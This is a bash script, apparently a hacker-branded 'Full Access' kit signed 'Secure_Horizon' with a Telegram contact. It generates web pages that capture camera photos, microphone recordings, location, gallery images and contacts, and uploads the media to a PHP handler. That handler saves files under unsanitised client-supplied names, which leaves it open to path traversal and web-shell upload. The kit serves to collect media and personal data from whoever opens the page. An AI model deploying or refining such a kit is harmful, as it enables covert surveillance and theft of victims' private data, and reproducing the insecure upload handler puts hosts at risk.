#!/bin/bash

# Colors for the script
GREEN='\033[0;32m'
CYAN='\033[0;36m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color

# Animated Banner with Dynamic Status
animate() {
  frames=("⢀⠀⡀" "⣀⡀" "⣤⡀" "⣦⡀" "⣷⡀" "⣿⡀" "⣿⣷" "⣿⣿" "⣿⣷" "⣿⡀" "⣷⡀" "⣦⡀" "⣤⡀" "⣀⡀" "⢀⠀⡀")
  for frame in "${frames[@]}"; do
    echo -ne "\r${CYAN}Loading... ${frame} ${NC}"
    sleep 0.1
  done
  echo -e "\r${GREEN}✔ Secure Horizon Server Initialized!${NC}"
}

# Banner
echo "⢀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⣴⣴⣾⣾⣾⣿⣿⣾⣿⣾⣿⣷⣷⣷⣷⣦⣦⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⢿⢛⢏⢟⢟⣿⣿⣿⣿⣿⣿⣿⣿⡿⡟⡟⢝⢟⢿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢼⣿⣏⣔⣴⣰⢄⢌⠘⠽⣿⣿⣿⣿⡿⠏⢃⢡⣠⣢⣢⣌⣻⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣮⡢⣮⣿⣿⣿⣮⢪⣾⣾⣿⣿⣿⣿⣿⣿⣯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⢿⣟⠽⠊⠊⠊⠫⢻⣾⣿⣿⣿⣷⠻⠙⠘⠘⠚⢽⢿⣿⣿⣯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣵⣷⣽⣪⣞⣮⣮⣾⣿⣾⣿⣯⣿⣷⣵⣲⣲⣳⣵⣷⣷⣻⣯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢗⣿⣿⣿⣺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣿⣿⣿⣿⣿⣿⢟⣿⣽⣟⣿⣿⣿⢾⣾⢿⡻⣿⣿⣿⣿⣿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⣷⣕⢭⠹⣾⣾⣿⣿⣏⡻⡽⣟⡟⣏⣿⣿⣿⣾⡾⠍⣕⢧⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣷⣝⢦⡈⠟⠟⠟⠏⠁⣠⣦⡀⠈⠛⠟⠟⠟⢀⡾⣣⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣎⢷⣷⣶⣵⣮⣦⣫⣫⣫⣦⣵⣶⣵⣾⢾⣱⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣯⣷⣿⣿⣿⣿⡛⠛⣻⣿⣿⣿⣿⣟⣵⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⢿⣷⣿⣿⣿⣿⡏⠀⢻⣿⣿⣿⣿⣾⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡅⠀⣸⣿⣿⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣧⢀⣾⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      ☠⠀Mr:Secure_Horizon⠀️☠"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  Telegram : @Unknownhacker2005"
echo "      ☠ Mr:Secure_Horizon ☠"
echo "      Localhost Web Server Script"
echo "      Developed by Secure Horizon"
echo "      Telegram: @Unknownhacker2005"
echo "------------------------------------------------------"
echo "      ANONYMOUS Secure_Horizon | Full Access Script"
echo "------------------------------------------------------"
echo "      Developer: Secure_Horizon"
echo "      @Unknownhacker2005"
echo "------------------------------------------------------"
echo -e "\033[0m"

animate

echo -e "${CYAN}Starting Localhost Web Server...${NC}"

# Generate a random port number between 8000 and 8999
PORT=$((RANDOM % 1000 + 8000))
echo -e "${GREEN}Randomized Port: $PORT${NC}"

# Create the necessary directories
if [ ! -d "uploads/photos" ]; then
    mkdir -p uploads/photos
    echo -e "${GREEN}Created directory: uploads/photos${NC}"
fi

if [ ! -d "uploads/audio" ]; then
    mkdir -p uploads/audio
    echo -e "${GREEN}Created directory: uploads/audio${NC}"
fi

# Check for the custom HTML file or create a default one with full access
if [ -f "index.html" ]; then
    echo -e "${GREEN}Custom index.html file found. Using it for the web server.${NC}"
else
    echo -e "${YELLOW}Custom index.html not found! Creating a default one with full access features.${NC}"
    cat << 'EOF' > index.html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Horizon - Full Access</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f0f0f0; }
        nav { background: #333; padding: 10px; }
        nav a { color: white; margin: 0 15px; text-decoration: none; }
        .content { margin-top: 20px; }
        video, audio { width: 300px; margin: 10px 0; }
    </style>
</head>
<body>
    <nav>
        <a href="index.html">Home</a>
        <a href="gallery.html">Gallery</a>
        <a href="contact.html">Contacts</a>
        <a href="location.html">Location</a>
    </nav>
    <div class="content">
        <h1>Secure Horizon - Full Access</h1>
        <p>Access Camera, Microphone, Location, Gallery, and Contacts.</p>

        <!-- Camera -->
        <h2>Camera</h2>
        <video id="video" autoplay></video>
        <button id="capture">Capture Photo</button>
        <canvas id="canvas" style="display:none;"></canvas>
        <img id="photo" alt="Captured Photo">

        <!-- Microphone -->
        <h2>Microphone</h2>
        <audio id="audio" controls></audio>
        <button id="record">Record</button>
        <button id="stop">Stop</button>

        <!-- Location -->
        <h2>Location</h2>
        <p id="location">Fetching location...</p>

        <!-- Gallery -->
        <h2>Gallery</h2>
        <input type="file" id="gallery" accept="image/*" multiple>
        <div id="gallery-preview"></div>

        <!-- Contacts -->
        <h2>Contacts</h2>
        <button id="get-contacts">Get Contacts</button>
        <ul id="contacts-list"></ul>
    </div>

    <script>
        // Camera Access
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const photo = document.getElementById('photo');
        const capture = document.getElementById('capture');

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => video.srcObject = stream)
            .catch(err => console.error('Error accessing camera:', err));

        capture.addEventListener('click', () => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            photo.src = canvas.toDataURL('image/png');
            photo.style.display = 'block';
            const blob = dataURLtoBlob(photo.src);
            const formData = new FormData();
            formData.append('photo', blob, `photo_${Date.now()}.png`);
            fetch('upload.php', { method: 'POST', body: formData })
                .then(() => console.log('Photo uploaded'))
                .catch(err => console.error('Upload error:', err));
        });

        function dataURLtoBlob(dataURL) {
            const byteString = atob(dataURL.split(',')[1]);
            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }

        // Microphone Access
        const audio = document.getElementById('audio');
        const record = document.getElementById('record');
        const stop = document.getElementById('stop');
        let mediaRecorder, audioChunks = [];

        record.addEventListener('click', () => {
            navigator.mediaDevices.getUserMedia({ audio: true })
                .then(stream => {
                    mediaRecorder = new MediaRecorder(stream);
                    mediaRecorder.start();
                    audioChunks = [];
                    mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
                    mediaRecorder.onstop = () => {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                        audio.src = URL.createObjectURL(audioBlob);
                        const formData = new FormData();
                        formData.append('audio', audioBlob, `audio_${Date.now()}.webm`);
                        fetch('upload.php', { method: 'POST', body: formData })
                            .then(() => console.log('Audio uploaded'))
                            .catch(err => console.error('Upload error:', err));
                    };
                })
                .catch(err => console.error('Error accessing microphone:', err));
        });

        stop.addEventListener('click', () => {
            if (mediaRecorder) mediaRecorder.stop();
        });

        // Location Access
        const locationP = document.getElementById('location');
        navigator.geolocation.getCurrentPosition(
            pos => locationP.textContent = `Latitude: ${pos.coords.latitude}, Longitude: ${pos.coords.longitude}`,
            err => locationP.textContent = `Error fetching location: ${err.message}`
        );

        // Gallery Access
        const gallery = document.getElementById('gallery');
        const galleryPreview = document.getElementById('gallery-preview');
        gallery.addEventListener('change', () => {
            galleryPreview.innerHTML = '';
            Array.from(gallery.files).forEach(file => {
                const img = document.createElement('img');
                img.src = URL.createObjectURL(file);
                img.style.width = '200px';
                galleryPreview.appendChild(img);
                const formData = new FormData();
                formData.append('photo', file);
                fetch('upload.php', { method: 'POST', body: formData })
                    .then(() => console.log('Photo uploaded'))
                    .catch(err => console.error('Upload error:', err));
            });
        });

        // Contacts Access
        const getContacts = document.getElementById('get-contacts');
        const contactsList = document.getElementById('contacts-list');
        getContacts.addEventListener('click', async () => {
            if ('contacts' in navigator && 'ContactsManager' in window) {
                const props = ['name', 'email', 'tel'];
                const opts = { multiple: true };
                try {
                    const contacts = await navigator.contacts.select(props, opts);
                    contactsList.innerHTML = '';
                    contacts.forEach(contact => {
                        const li = document.createElement('li');
                        li.textContent = `${contact.name} - ${contact.tel} - ${contact.email}`;
                        contactsList.appendChild(li);
                    });
                } catch (err) {
                    contactsList.innerHTML = `<li>Error fetching contacts: ${err}</li>`;
                }
            } else {
                contactsList.innerHTML = '<li>Contacts API is not supported in this browser.</li>';
            }
        });
    </script>
</body>
</html>
EOF
fi

# Create additional pages (Gallery, Contacts, Location)
cat << 'EOF' > gallery.html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Gallery - Secure Horizon</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f0f0f0; }
        nav { background: #333; padding: 10px; }
        nav a { color: white; margin: 0 15px; text-decoration: none; }
        .gallery { display: flex; flex-wrap: wrap; gap: 10px; }
        .gallery img { width: 200px; height: auto; }
    </style>
</head>
<body>
    <nav>
        <a href="index.html">Home</a>
        <a href="gallery.html">Gallery</a>
        <a href="contact.html">Contacts</a>
        <a href="location.html">Location</a>
    </nav>
    <div class="content">
        <h1>Gallery</h1>
        <div class="gallery" id="gallery"></div>
    </div>
    <script>
        fetch('uploads/photos/')
            .then(response => response.text())
            .then(text => {
                const parser = new DOMParser();
                const doc = parser.parseFromString(text, 'text/html');
                const images = doc.querySelectorAll('a[href$=".png"], a[href$=".jpg"], a[href$=".jpeg"]');
                const gallery = document.getElementById('gallery');
                images.forEach(img => {
                    const imgElement = document.createElement('img');
                    imgElement.src = 'uploads/photos/' + img.getAttribute('href');
                    gallery.appendChild(imgElement);
                });
            });
    </script>
</body>
</html>
EOF

cat << 'EOF' > contact.html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Contacts - Secure Horizon</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f0f0f0; }
        nav { background: #333; padding: 10px; }
        nav a { color: white; margin: 0 15px; text-decoration: none; }
    </style>
</head>
<body>
    <nav>
        <a href="index.html">Home</a>
        <a href="gallery.html">Gallery</a>
        <a href="contact.html">Contacts</a>
        <a href="location.html">Location</a>
    </nav>
    <div class="content">
        <h1>Contact Us</h1>
        <p>Email: securehorizon@example.com</p>
        <p>Telegram: @Unknownhacker2005</p>
    </div>
</body>
</html>
EOF

cat << 'EOF' > location.html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Location - Secure Horizon</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f0f0f0; }
        nav { background: #333; padding: 10px; }
        nav a { color: white; margin: 0 15px; text-decoration: none; }
    </style>
</head>
<body>
    <nav>
        <a href="index.html">Home</a>
        <a href="gallery.html">Gallery</a>
        <a href="contact.html">Contacts</a>
        <a href="location.html">Location</a>
    </nav>
    <div class="content">
        <h1>Our Location</h1>
        <p id="location">Fetching location...</p>
        <script>
            navigator.geolocation.getCurrentPosition(
                pos => document.getElementById('location').textContent = `Latitude: ${pos.coords.latitude}, Longitude: ${pos.coords.longitude}`,
                err => document.getElementById('location').textContent = `Error fetching location: ${err.message}`
            );
        </script>
    </div>
</body>
</html>
EOF

# Create the PHP file to handle uploads
cat << 'EOF' > upload.php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['photo'])) {
        $fileName = 'uploads/photos/' . $_FILES['photo']['name'];
        move_uploaded_file($_FILES['photo']['tmp_name'], $fileName);
    } elseif (isset($_FILES['audio'])) {
        $fileName = 'uploads/audio/' . $_FILES['audio']['name'];
        move_uploaded_file($_FILES['audio']['tmp_name'], $fileName);
    }
}
?>
EOF

echo -e "${GREEN}Server is running at http://127.0.0.1:$PORT${NC}"

# Start the PHP server with the randomized port
php -S 127.0.0.1:$PORT

echo -e "${RED}Press Ctrl+C to stop the server.${NC}"